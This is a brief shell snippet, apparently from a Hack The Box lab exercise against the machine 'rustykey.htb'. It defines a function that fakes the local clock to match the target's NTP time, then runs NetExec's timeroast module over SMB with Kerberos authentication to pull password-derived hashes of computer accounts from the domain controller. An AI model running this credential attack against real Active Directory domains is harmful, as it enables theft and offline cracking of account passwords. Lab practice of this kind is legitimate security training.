ff() {
  faketime "$(ntpdate -q 10.10.11.75 | grep -oP '\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}')" "$@"
}

ff nxc smb 10.10.11.75 -d rustykey.htb -u 'rr.parker'  -k -M timeroast
